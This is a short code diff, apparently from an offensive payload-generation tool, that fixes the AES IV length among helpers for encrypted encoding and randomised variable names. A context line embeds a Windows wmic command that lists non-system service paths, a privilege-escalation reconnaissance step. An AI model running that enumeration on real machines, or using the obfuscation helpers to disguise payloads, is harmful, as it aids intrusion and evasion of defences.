@@ -110,7 +110,7 @@ BLOCK_SIZE, PADDING = 32, '{'
 pad = lambda s: str(s) + (BLOCK_SIZE - len(str(s)) % BLOCK_SIZE) * PADDING
 EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
 DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
-key, key2, iv, secretkey = randKey(32), randKey(16), randKey(32), randKey(32)
+key, key2, iv, secretkey = randKey(32), randKey(32), randKey(16), randKey(32)
 be64var, bd64var, AESvar, envvar = randVar(), randVar(), randVar(), randVar()
 triplequote = "'" * 3
 lswinservices = triplequote + '''for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a''' + triplequote
